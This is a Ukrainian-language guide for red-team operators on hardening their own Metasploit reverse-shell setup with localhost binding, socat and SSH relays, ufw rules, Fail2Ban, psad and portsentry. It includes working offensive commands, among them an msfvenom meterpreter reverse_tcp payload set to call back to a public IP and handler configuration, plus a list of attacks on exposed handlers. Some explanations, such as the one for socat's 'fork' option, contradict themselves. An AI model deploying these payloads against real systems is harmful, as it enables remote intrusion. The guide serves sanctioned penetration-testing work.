# 🛡️ Захист Red Team-оператора під час роботи з публічною IP та реверс-сесіями

## 📋 Зміст

- [1. Основна загроза при відкритому listener'і](#1)
- [2. Мережеві режими віртуалки: безпека та атаки](#2)
- [3. Проксіювання реверс-сесії без відкритого listener'а](#3)
- [4. Використання ufw для обмеження доступу](#4)
- [5. Методи атаки на незахищену сесію](#5)
- [6. Команди, приклади, PoC](#6)
- [7. Проксі + захист] (#7)

---

## <a name="1"></a>1. Основна загроза при відкритому listener'і

### Якщо handler відкритий (0.0.0.0:4444):

- Будь-хто в мережі/Інтернеті може:
  - Під'єднати фейковий шелл;
  - Атакувати Metasploit handler (використовуючи вразливості або автозапуск скриптів);
  - Сканувати та визначити fingerprint listener'а;
  - Перехопити або нав'язати C2-підключення.

### Що використовувати натомість:

- `set ReverseListenerBindAddress 127.0.0.1`
- Проксі трафік через `socat`, `ssh -R`, або `Tor Hidden Service`

---

## <a name="2"></a>2. Мережеві режими віртуалки: безпека та атаки

| Режим | IP Kali | Інтернет | Видимість | Примітка |
|-------|---------|----------|------------|----------|
| NAT | Приватний | ✅ | ❌ | Безпечний, але жертва не побачить Kali |
| Bridged | LAN IP (192.168.x.x) | ✅ | ✅ | Вразливий, якщо немає фаєрволу |
| Host-only | 192.168.56.x | ❌ | ❌ | Тільки Kali ↔ Host |
| Internal | ізольований | ❌ | ❌ | Для LAB |
| NAT Network | приватний | ✅ | ❌ | Потрібна ручна маршрутизація |

---

## <a name="3"></a>3. Проксіювання реверс-сесії без відкритого listener'а

### Listener в Kali:

```bash
set payload windows/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 4444
set ReverseListenerBindAddress 127.0.0.1
exploit -j
```

### Проксі на хості (ефективний для Metasploit payload):

```bash
socat TCP4-LISTEN:4444,fork TCP4:192.168.141.129:4444
```

### Або через SSH:

```bash
ssh -R 4444:127.0.0.1:4444 user@vps
```

### Ефективний механізм обмеження до одного shell через socat на nc -nlvp.
```bash
socat -T5000 TCP4-LISTEN:4444,fork,reuseaddr,max-children=1 TCP4:192.168.141.129:4444
```
```bash
socat -T300 TCP4-LISTEN:4444,fork,reuseaddr,range=192.168.141.10/32,max-children=1 TCP4:192.168.141.129:4444
```
🔍 Пояснення:

- `fork` – означає, що лише одне з’єднання обслуговується. Після встановлення з'єднання, обробить його у дочірньому процесі та продовжить слухати нові підключення;
- `max-children=1` — лише одне з’єднання, не запускається без `fork`.
- `socat` завершується після закриття shell'у, не чекає нові конекшени;
- без `-T` – щоб уникнути тайм-ауту без активності;
- `pty` – інтерактивна оболонка;
- `stderr,sigint,sane` – для повноцінного користування оболонкою.
- `range=192.168.141.10/32` — дозволити тільки одне джерело.

---

## <a name="4"></a>4. Використання ufw для обмеження доступу

### Базова настройка:

```bash
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
```

### Дозволити лише конкретному IP:

```bash
sudo ufw allow from 192.168.3.110 to any port 4444 proto tcp
```

---

## <a name="5"></a>5. Методи атаки на незахищену сесію

- "Back Shell" — атакуючий надсилає свій payload у відкритий handler
- Використання `AutoRunScript` для виконання коду на Kali
- Зловживання Metasploit API (`msgrpc`)
- Підміна `meterpreter`-сесії
- Експлуатація через неправильні ACL або небезпечні модулі

---

## <a name="6"></a>6. Команди, приклади, PoC

### Reverse Shell генерація:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=25.25.25.25 LPORT=4444 -f exe > shell.exe
```

### Локальний захищений handler:

```bash
set lhost 127.0.0.1
set ReverseListenerBindAddress 127.0.0.1
```

`ReverseListenerBindAddress` визначає, на яку локальну IP-адресу на вашій атакуючій машині буде прив'язаний (bind) слухач. Це означає, що Metasploit буде слухати вхідні з'єднання лише на цій конкретній IP-адресі.

`set ReverseListenerBindAddress 127.0.0.1` означає, що слухач буде прив'язаний до локального інтерфейсу зворотного зв'язку (localhost) вашої машини. Тобто, Metasploit буде чекати з'єднань лише від самої себе.

## <a name="6"></a>6. Проксі + захист:

```bash
socat TCP4-LISTEN:4444,fork TCP4:127.0.0.1:4444
sudo ufw allow from ЖЕРТВА_IP to any port 4444 proto tcp
```
## ufw — обмеження доступу по IP

```bash
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow from ЖЕРТВА_IP to any port 4444 proto tcp
```

---

## Fail2Ban

### Встановлення:

```bash
sudo apt install fail2ban
```

### Конфіг `jail.local`:

```ini
[customport]
enabled = true
filter = customport
action = iptables[name=customport, port=4444, protocol=tcp]
logpath = /var/log/syslog
maxretry = 1
findtime = 60
bantime = 600
```

### Фільтр `customport.conf`:

```ini
[Definition]
failregex = .*4444.*Connection refused.*
ignoreregex =
```

---

## psad — IDS на базі iptables

### Встановлення:

```bash
sudo apt install psad
```

### Налаштування `/etc/psad/psad.conf` (фрагмент):

```ini
EMAIL_ADDRESSES             "";
HOSTNAME                    kali.local;
ENABLE_AUTO_IDS             Y;
ENABLE_SYSLOG_FILE          Y;
```

📁 Логи: `/var/log/psad/`

---

## portsentry — активне блокування сканерів

### Встановлення:

```bash
sudo apt install portsentry
```

### `/etc/default/portsentry`:

```ini
TCP_MODE="atcp"
UDP_MODE="audp"
```

### `/etc/portsentry/portsentry.conf`:

```ini
BLOCK_UDP="1"
BLOCK_TCP="1"
KILL_ROUTE="/sbin/iptables -I INPUT -s $TARGET$ -j DROP"
KILL_RUN_CMD="/bin/echo 'PSENTRY: $TARGET$ blocked on $(date)' >> /var/log/portsentry-block.log"
RESOLVE_HOST = "0"
ADVANCED_PORTS_TCP="1024"
ADVANCED_PORTS_UDP="1024"
ADVANCED_EXCLUDE_TCP="22,80,443,4444"
ADVANCED_EXCLUDE_UDP=""
```
---

## 🧩 Рекомендації:

- Listener завжди на `127.0.0.1`
- Проксі тільки з IP-фільтрами
- Контроль кількості підключень (`socat max-children=1`)
- Моніторинг через `tcpdump`, `ss`, `netstat`
